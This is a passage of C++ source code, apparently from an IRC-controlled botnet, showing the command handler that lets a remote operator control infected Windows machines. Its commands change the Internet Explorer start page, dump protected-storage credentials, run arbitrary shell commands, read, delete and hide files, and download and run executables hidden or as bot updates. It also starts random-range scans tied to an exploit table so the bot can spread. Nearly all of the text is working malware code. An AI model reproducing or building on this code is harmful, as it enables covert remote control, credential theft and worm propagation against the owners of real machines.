		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,process_title,"Process thread",GetLastError());
		}
		return 1;
	}
#endif // NO_PROCESS


	//////////////////////////////////////////////////////////////////////////////
	//								Randnick
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_nickupd_1, a[0]))
	{
		if (NICK_TYPE != N_MINE)
			return 1;
		unsigned int ud=GetTickCount()/86400000;
		if (ud>irc->get_nicktime())
		{
			irc->nick(irc->nickgen(NICK_TYPE,REQ_NICKLEN));
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Randnick
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_rndnick_1, a[0]))
	{
		irc->nick(irc->nickgen(NICK_TYPE,REQ_NICKLEN));
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								IEStart
	//				Changes the Internet Explorer startup page
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_IESTART
	else if (!lstrcmpi(cmd_iestart_1,a[0]))
	{

#ifndef NO_SERVICE
		ImpersonateInteractiveUser();
#endif
		if (!noadvapi32)
		{
			if (!a[1])
			{
				char *spage=RegQuery(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","Start Page");
				if (!spage)
				{
					if (!switches.silent && switches.verbose)
						irc->privmsg(hostd->target,"%s Error retrieving start page.",main_title);
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Current Internet Explorer start page: %s.",main_title,spage);
				}
				return 1;
			}
			if (RegWrite(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","Start Page",a[1]))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Set Internet Explorer start page to: \"%s\"", main_title, a[1]);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to set the Internet Explorer start page.", main_title);
			}
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_noadvapi,main_title);
		}

		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Join
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_join_1,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->join(a[1],(a[2]?a[2]:""));
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Part
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_part_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->part(a[1]);
//		addlogv(MAINLOG, "%s Parted channel: '%s'.", irc_title, a[s+1]);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Raw
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_raw_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		char *raw=strchr(params,' ');
		if (raw)
		{
			raw++;//remove the space
			irc->raw(raw);
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Sent IRC raw: \"%s\".",irc_title,raw);
		}
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Prefix
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_prefix_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		prefix = a[1][0];
		irc->privmsg(hostd->target,"%s Prefix changed to: '%c'.",main_title,a[1][0]);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								FlushARP
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_FLUSHARP
	else if (!lstrcmpi(cmd_flusharp_1,a[0]))
	{
		if (FlushARPCache())
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s ARP cache flushed.",main_title);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Failed to flush ARP cache.",main_title);
		}
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								FlushDNS
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_FLUSHDNS
	else if (!lstrcmpi(cmd_flushdns_1,a[0]))
	{
		if (fDnsFlushResolverCache)
		{
			if (fDnsFlushResolverCache())
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s DNS cache flushed.",main_title);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to flush DNS cache.",main_title);
			}
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Failed to load dnsapi.dll.",main_title);
		}
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								DNS
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_dns_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,main_title);
			return 1;
		}
		LPHOSTENT hostent = NULL;
		IN_ADDR iaddr;
		DWORD addr = finet_addr(a[1]);

		if (addr != INADDR_NONE)
		{
			hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
			if (hostent != NULL)
			{
				irc->privmsg(hostd->target,"%s Lookup: %s -> %s.", main_title, a[1], hostent->h_name);
				return 1;
			}
		}
		else
		{
			hostent = fgethostbyname(a[1]);
			if (hostent != NULL)
			{
				iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
				irc->privmsg(hostd->target,"%s Lookup: %s -> %s.", main_title, a[1], finet_ntoa(iaddr));
				return 1;
			}
		}
		
		irc->privmsg(hostd->target,"%s Could not resolve hostname.", main_title);
		
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//							Protected storage
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_PSTORE
	else if (!lstrcmpi(cmd_pstore_1,a[0]))
	{
		if ((tnum=findthreadnum(PSTORE_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,pstore_title,"Protected storage thread",tnum);
			return 1;
		}
		NTHREAD pstore;
		pstore.conn=irc;
		strcpy(pstore.target,hostd->target);
		pstore.gotinfo = FALSE;
		pstore.silent=switches.silent;
		pstore.verbose=switches.verbose;
		if (a[1])
		{
			if (strstr(a[1],"*"))
				pstore.data1=a[1];//filter
			else
				pstore.data1=NULL;
		}
		else
			pstore.data1=NULL;

		pstore.threadnum = addthread(PSTORE_THREAD,"%s Protected storage thread.",pstore_title);
		if (threads[pstore.threadnum].tHandle = CreateThread(NULL, 0, &PStore, (LPVOID)&pstore, 0, &id))
		{
			while (pstore.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,pstore_title,"Protected storage thread",GetLastError());
		}
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//							System info
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SYSINFO
	else if (!lstrcmpi(cmd_sysinfo_1,a[0]))
	{
		sysinfo(hostd->target,irc);
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//							Network info
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SYSINFO
	else if (!lstrcmpi(cmd_netinfo_1,a[0]))
	{
#ifndef NO_GET_IP_HTTP
		if (!exip || !strcmp(exip,"") || PrivateIP(exip))
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Trying to get external IP.",netinfo_title);
			DWORD id;
			HANDLE th;
			th=CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
			
			WaitForSingleObject(th,10000);
			CloseHandle(th);
		}
#endif
		netinfo(hostd->target,irc);//default mb
		return 1;
	}
#endif
	
	//////////////////////////////////////////////////////////////////////////////
	//							mIRC Command
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_MIRCCMD
	else if (!lstrcmpi(cmd_mirccmd_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,mirc_title);
			return 1;
		}
		
		char cmd[MAX_PATH];
		char tbuf[IRCLINE];
		sprintf(cmd,"%s",a[1]);
		for (int u=2;u<t;u++)// add the rest of the params to the file
		{					 // dont feel like making a quote parser
			if (a[u])
			{
				sprintf(tbuf," %s",a[u]);
				strncat(cmd,tbuf,sizeof(cmd));
			}
		}
		if (SendIrcCommand(cmd))
		{
			irc->privmsg(hostd->target,"%s Command sent: \"%s\"",mirc_title,cmd);
		}
		else
		{
			irc->privmsg(hostd->target,"%s Client not open: \"%s\"",mirc_title,cmd);
		}
		return 1;
	}
#endif
	
	//////////////////////////////////////////////////////////////////////////////
	//							System
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_system_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,main_title);
			return 1;
		}
		char *cmd=strchr(params,' ');
		if (cmd)
		{
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;
				
				int i;
				for (i=0;i<strlen(cmd);i++)
					if (cmd[i]==replace)
						cmd[i]=' ';
			}

			cmd++;//remove the space
			if (system(cmd))
			{ //failed
				irc->privmsg(hostd->target,"%s System call failed.",main_title);
			}
			else
			{ //good
				irc->privmsg(hostd->target,"%s System call sent: \"%s\"",main_title,cmd);
			}
		}
		return 1;
	}
	
	//////////////////////////////////////////////////////////////////////////////
	//							File Control
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_FILECTRL
	else if (!lstrcmpi(cmd_filectrl_1,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,file_title);
			return 1;
		}
		char file[MAX_PATH];
		char tbuf[IRCLINE];
		sprintf(file,"%s",a[2]);
		for (int u=3;u<t;u++)// add the rest of the params to the file
		{					 // don't feel like making a quote parser
			if (a[u])
			{
				sprintf(tbuf," %s",a[u]);
				strncat(file,tbuf,sizeof(file));
			}
		}

		//.file <cat> <file>
		if (!lstrcmpi("cat",a[1]))
		{
			char file[MAX_PATH];
			char tbuf[IRCLINE];
			FILE *fp;
			sprintf(file,"%s",a[2]);
			for (int u=3;u<t;u++)// add the rest of the params to the file
			{
				if (a[u])
				{
					sprintf(tbuf," %s",a[u]);
					strcat(file,tbuf);
				}
			}

			if ((fp = fopen(file,"r")) != NULL)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Displaying file: %s",file_title,file);

				char filebuf[IRCLINE];
				while (fgets(filebuf,sizeof(filebuf),fp) != NULL)
					irc->privmsg(hostd->target,"%s",filebuf);
				fclose(fp);

				if (!switches.silent)
					irc->privmsg(hostd->target,"%s File displayed: %s",file_title,file);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to read file: %s, error: <%d>",file_title,file,GetLastError());
			}
			return 1;
		}

		//.file <ex> <file>
		else if (!lstrcmpi("ex",a[1]))
		{
			if (FileExists(file))
			{
				irc->privmsg(hostd->target,"%s File exists: %s",file_title,file);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s File doesn't exist: %s",file_title,file);
			}
			return 1;
		}

		//.file <rm> <file>
		else if (!lstrcmpi("rm",a[1]))
		{
			if (DeleteFile(file))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s File deleted: %s",file_title,file);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to delete file: %s, error: <%d>",file_title,file,GetLastError());
			}
			return 1;
		}
		
		//.file <rmdir> <dir>
		else if (!lstrcmpi("rmdir",a[1]))
		{
			if (FileExists(file))
			{
				if (IsFolder(file))
				{
					RemoveCompleteDirectory(file);
					if (!FileExists(file))
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,"%s Folder deleted: %s",file_title,file);
					}
					else
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,"%s Failed to delete folder: %s",file_title,file);
					}
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s %s is not a folder.",file_title,file);
				}
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s %s doesn't exist.",file_title,file);
			}
			return 1;
		}

		//.file <mv> <file> <new file>
		// -r: replaces _s in the file (again don't feel like making a quote parser)
		// -r:<char>: replaces <char> in the file
		else if (!lstrcmpi("mv",a[1]))
		{
			if (!a[3])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,file_title);
				return 1;
			}
			char tofile[MAX_PATH];
			sprintf(file,a[2]);
			sprintf(tofile,a[3]);
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;

				int i;
				for (i=0;i<strlen(file);i++)
					if (file[i]==replace)
						file[i]=' ';

				for (i=0;i<strlen(tofile);i++)
					if (tofile[i]==replace)
						tofile[i]=' ';
			}
			if (MoveFile(file,tofile))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Moved: \"%s\" to: \"%s\"", file_title, file, tofile);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to move: \"%s\" to: \"%s\", error: <%d>", file_title, file, tofile, GetLastError());
			}
			return 1;
		}

		//.file <cp> <file> <new file>
		// -r: replaces _s in the file (again dont feel like making a quote parser)
		// -r:<char>: replaces <char> in the file
		// -O: overwrite the file if it already exists
		else if (!lstrcmpi("cp",a[1]))
		{
			if (!a[3])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,file_title);
				return 1;
			}
			char tofile[MAX_PATH];
			sprintf(file,a[2]);
			sprintf(tofile,a[3]);
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;

				int i;
				for (i=0;i<strlen(file);i++)
					if (file[i]==replace)
						file[i]=' ';

				for (i=0;i<strlen(tofile);i++)
					if (tofile[i]==replace)
						tofile[i]=' ';
			}
			if (CopyFile(file,tofile,(switches.overwrite?FALSE:TRUE)))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Copied: \"%s\" to: \"%s\"", file_title, file, tofile);
			}
			else 
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to copy: \"%s\" to: \"%s\", error: <%d>", file_title, file, tofile, GetLastError());
			}
			return 1;
		}

		//.file <at> <file>
		// -N: normal
		// -S: system
		// -H: hidden
		// -R: read-only
		else if (!lstrcmpi("at",a[1]))
		{
			DWORD tmp;
			if (switches.attrib_system)
				tmp |= FILE_ATTRIBUTE_SYSTEM;
			if (switches.attrib_hidden)
				tmp |= FILE_ATTRIBUTE_HIDDEN;
			if (switches.attrib_readonly)
				tmp |= FILE_ATTRIBUTE_READONLY;
			if (switches.attrib_normal)
				tmp = FILE_ATTRIBUTE_NORMAL;

			if (SetFileAttributes(file,tmp))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Attibutes set to: \"%s\".", file_title, file);
			}
			else 
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to set attibutes to: \"%s\", error: <%d>", file_title, file, GetLastError());
			}
			return 1;
		}

		//.file <op> <file>
		else if (!lstrcmpi("op",a[1]))
		{
			sprintf(file,a[2]);
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;
				int i;
				for (i=0;i<strlen(file);i++)
					if (file[i]==replace)
						file[i]=' ';
			}

			if (fShellExecute(0,"open",file,NULL,NULL,SW_SHOW))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Opened: \"%s\".", file_title, file);
			}
			else 
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to open: \"%s\", error: <%d>", file_title, file, GetLastError());
			}
			return 1;
		}

		return 1;
	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_DOWNLOAD
	else if (!lstrcmpi(cmd_download_1,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,download_title);
			return 1;
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,download_title,"transfer thread",tnum);
			return 1;
		}
		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];//site
		dl.data2=a[2];//location
		dl.bdata1 = FALSE;//update
		dl.bdata2 = (a[3]?TRUE:FALSE);//run
		dl.bdata3 = (a[4]?TRUE:FALSE);//run hidden
		//dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
		//dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
		//dl.encrypted=(parameters['e']);
				
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading URL: %s to: %s.",download_title,"*",a[2]);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Downloading URL: %s to: %s.",download_title,a[1],a[2]);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,download_title,"transfer thread",GetLastError());
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Update
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_UPDATE
	else if (!lstrcmpi(cmd_update_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,update_title);
			return 1;
		}
		if (a[2])
		{
			if (!lstrcmpi(botid,a[2]))
			{
				return 1;
			}
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			return 1;
		}

		char tempdir[MAX_PATH], tmpbuf[MAX_PATH];
		GetTempPath(sizeof(tempdir), tempdir);
		sprintf(tmpbuf,"%seraseme_%d%d%d%d%d.exe",tempdir,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);

		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=tmpbuf;
		if (a[3]) dl.idata1=1;
		else	  dl.idata1=0;
		dl.bdata1 = TRUE;//update
		dl.bdata2 = FALSE;//run
		dl.bdata3 = FALSE;//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,"*",dl.data2);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Downloading update from: %s to: %s.",update_title,a[1],dl.data2);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,update_title,"transfer thread",GetLastError());
		}
		return 1;
	}
#endif // NO_UPDATE
#endif // NO_DOWNLOAD

#ifndef NO_ADVSCAN

	//////////////////////////////////////////////////////////////////////////////
	//								Current IP
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_currentip_1,a[0]))
	{
		int scanthread;
		if (a[1])
			scanthread = atoi(a[1]);
		else
			scanthread = findthreadnum(SCAN_THREAD);
		if (scanthread != 0)
			CurrentIP(irc,hostd->target,scanthread);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//							Advscan
	//////////////////////////////////////////////////////////////////////////////
	//.advscan <port> <threads> <delay> <mins> <ip/[-a/-b/-c][-e][-r]>
	//.advscan banner <threads> <delay> <mins> <ip> <port>
	else if (!lstrcmpi(cmd_advscan_1,a[0]))
	{
		if (!a[1] || !a[2] || !a[3] || !a[4])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,scan_title);
			return 1;
		}

		int scanthreads=findthreadid(SCAN_THREAD);
		if ((scanthreads+atoi(a[2])) > MAX_SCANTHRD)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Already scanning with %d threads. Too many specified.", scan_title, scanthreads);
		}
		else
		{
			ADVSCAN advscan;
			advscan.port = (unsigned short)atoi(a[1]);
			advscan.threads = atoi(a[2]);
			advscan.delay = atoi(a[3]);
			advscan.delay = ((advscan.delay < MIN_SCANDELAY)?(MIN_SCANDELAY):(advscan.delay));
			advscan.delay = ((advscan.delay > MAX_SCANDELAY)?(MAX_SCANDELAY):(advscan.delay));
			advscan.minutes = atoi(a[4]);
			advscan.minutes = ((advscan.minutes > MAX_SCANTIME)?(MAX_SCANTIME):(advscan.minutes));
			advscan.exploit = -1;
									
			for(i=0;exploit[i].port != 0 && exploit[i].port != NULL;i++)
			{
				if (!lstrcmpi(exploit[i].command,a[1]))
				{
					advscan.port = exploit[i].port;
					advscan.exploit = i;

					break;
				}
			}

			if (advscan.port == 0)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to start scan, port is invalid.", scan_title);
			}
			else
			{
				if (a[5])
				{
					if (!strcmp("x.x.x.x",a[5]))
					{
						srand(GetTickCount());
						unsigned int aclass;
						for (;;) {
							aclass=(rand()%240)+4;
							if (aclass==127)
								continue;
							else
								break;
						}
						_snprintf(advscan.ip,sizeof(advscan.ip),"%d.x.x.x",aclass);
						advscan.random = TRUE;
					}
					else
					{
						_snprintf(advscan.ip,sizeof(advscan.ip),a[5]);
						advscan.random = ((strchr(a[5],'x'))?(TRUE):(FALSE));
					}
				}
				else
				{
					if (switches.scan_e || switches.scan_a || switches.scan_b || switches.scan_c || switches.scan_r)
					{
						if (switches.scan_e)
						{
							int Class=0;
							if (switches.scan_a)
								Class=1;
							else if (switches.scan_b)
								Class=2;
							else if (switches.scan_c)
								Class=3;
							else
							{
								if (!switches.silent)
									irc->privmsg(hostd->target,"%s No subnet class specified, try \"-a\" or \"-b\" or \"-c\"", scan_title);
								return 1;
							}
#ifndef NO_GET_IP_HTTP
							if (!exip || !strcmp(exip,"") || PrivateIP(exip))
							{
								if (!switches.silent && !switches.halfsilent)
									irc->privmsg(hostd->target,"%s Trying to get external IP.",scan_title);
								DWORD id;
								HANDLE th;
								th=CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
								
								WaitForSingleObject(th,10000);
								CloseHandle(th);
							}
#endif
							char *extip=MakeIP(exip,switches.scan_r,Class);
							if (extip)
								strncpy(advscan.ip,extip,sizeof(advscan.ip));
							else
							{
								if (!switches.silent)
									irc->privmsg(hostd->target,"%s Could not parse external IP.", scan_title);
								return 1;
							}
							advscan.random=switches.scan_r;
						}
						else
						{
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(irc->get_sock(),(LPSOCKADDR)&ssin,&ssin_len);

							if (switches.scan_a)
								ssin.sin_addr.S_un.S_addr&=0xFF;

							else if (switches.scan_b)
								ssin.sin_addr.S_un.S_addr&=0xFFFF;

							else if (switches.scan_c)
								ssin.sin_addr.S_un.S_addr&=0xFFFFFF;

							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));
							if (switches.scan_r)
							{
								int extractip=0;
								if (switches.scan_a)
									extractip=3;
								else if (switches.scan_b)
									extractip=2;
								else if (switches.scan_c)
									extractip=1;

								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
									
								advscan.random=TRUE;
							}
							else
								advscan.random=FALSE;
						}
					}
					else
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,"%s Failed to start scan, no IP specified.", scan_title);
						return 1;
					}
				}

				advscan.silent = switches.silent;
				advscan.verbose = switches.verbose;
				advscan.conn=irc;
				strcpy(advscan.target,servers[curserver].chan);
				advscan.threadnum=addthread(SCAN_THREAD,"%s %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", scan_title,((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
				if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
					while(advscan.gotinfo == FALSE)
						Sleep(50);
						
					if (!switches.silent && !switches.halfsilent)
						irc->privmsg(hostd->target,"%s %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", scan_title,((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Failed to start scan thread, error: <%d>.", scan_title, GetLastError());
				}
			}
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//							Scan All/NTScan/WKS(E/O)Scan
	//////////////////////////////////////////////////////////////////////////////
	//.scanall <threads> <delay> <mins> <ip/[-a/-b/-c][-e][-r]>
	else if (!lstrcmpi(cmd_scanall_1,a[0]))
	{
		if (!a[1] || !a[2] || !a[3])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,scan_title);
			return 1;
		}
		
		int scanthreads=findthreadid(SCAN_THREAD);
		if ((scanthreads+atoi(a[1])) > MAX_SCANTHRD)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Already scanning with %d threads. Too many specified.", scan_title, scanthreads);
		}

		for(int sne=0; sne<scanallsize; sne++)
		{
			ADVSCAN advscan;
			advscan.threads = atoi(a[1])/scanallsize;
			advscan.delay = atoi(a[2]);
			advscan.delay = ((advscan.delay < MIN_SCANDELAY)?(MIN_SCANDELAY):(advscan.delay));
			advscan.delay = ((advscan.delay > MAX_SCANDELAY)?(MAX_SCANDELAY):(advscan.delay));
			advscan.minutes = atoi(a[3]);
			advscan.minutes = ((advscan.minutes > MAX_SCANTIME)?(MAX_SCANTIME):(advscan.minutes));
			advscan.exploit = -1;

			for(i=0;exploit[i].port != 0;i++)
			{
				if (strcmp(exploit[i].command, scanall[sne].command) == 0)
				{
					advscan.port = exploit[i].port;
					advscan.exploit = i;
					break;
				}
			}

			if (advscan.port == 0)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to start scan, port is invalid.", scan_title);
			}
			else
			{
				if (a[4])
				{
					if (!strcmp("x.x.x.x",a[4]))
					{
						srand(GetTickCount());
						unsigned int aclass;
						for (;;) {
							aclass=(rand()%240)+4;
							if (aclass==127)
								continue;
							else
								break;
						}
						_snprintf(advscan.ip,sizeof(advscan.ip),"%d.x.x.x",aclass);
						advscan.random = TRUE;
					}
					else
					{
						_snprintf(advscan.ip,sizeof(advscan.ip),a[4]);
						advscan.random = ((strchr(a[4],'x'))?(TRUE):(FALSE));
					}
				}
				else
				{
					if (switches.scan_e || switches.scan_a || switches.scan_b || switches.scan_c || switches.scan_r)
					{
						if (switches.scan_e)
						{
							int Class=0;
							if (switches.scan_a)
								Class=1;
							else if (switches.scan_b)
								Class=2;
							else if (switches.scan_c)
								Class=3;
							else
							{
								if (!switches.silent)
									irc->privmsg(hostd->target,"%s No subnet class specified, try \"-a\" or \"-b\" or \"-c\"", scan_title);
								return 1;
							}
#ifndef NO_GET_IP_HTTP
							if (!exip || !strcmp(exip,"") || PrivateIP(exip))
							{
								if (!switches.silent && !switches.halfsilent)
									irc->privmsg(hostd->target,"%s Trying to get external IP.",scan_title);
								DWORD id;
								HANDLE th;
								th=CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
								
								WaitForSingleObject(th,10000);
								CloseHandle(th);
							}
#endif
							char *extip=MakeIP(exip,switches.scan_r,Class);
							if (extip)
								strncpy(advscan.ip,extip,sizeof(advscan.ip));
							else
							{
								if (!switches.silent)
									irc->privmsg(hostd->target,"%s Could not parse external IP.", scan_title);
								return 1;
							}
							advscan.random=switches.scan_r;
						}
						else
						{
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(irc->get_sock(),(LPSOCKADDR)&ssin,&ssin_len);

							if (switches.scan_a)
								ssin.sin_addr.S_un.S_addr&=0xFF;

							else if (switches.scan_b)
								ssin.sin_addr.S_un.S_addr&=0xFFFF;

							else if (switches.scan_c)
								ssin.sin_addr.S_un.S_addr&=0xFFFFFF;

							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));
							if (switches.scan_r)
							{
								int extractip=0;
								if (switches.scan_a)
									extractip=3;
								else if (switches.scan_b)
									extractip=2;
								else if (switches.scan_c)
									extractip=1;

								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
								
								advscan.random=TRUE;
							}
							else
								advscan.random=FALSE;
						}
					}
					else
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,"%s Failed to start scan, no IP specified.", scan_title);
						return 1;
					}
				}

				advscan.silent = switches.silent;
				advscan.verbose = switches.verbose;
				advscan.conn=irc;
				strcpy(advscan.target,servers[curserver].chan);
				advscan.threadnum=addthread(SCAN_THREAD,"%s %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", scan_title,((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
				if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
					while(advscan.gotinfo == FALSE)
						Sleep(50);
					
					if (!switches.silent && !switches.halfsilent)
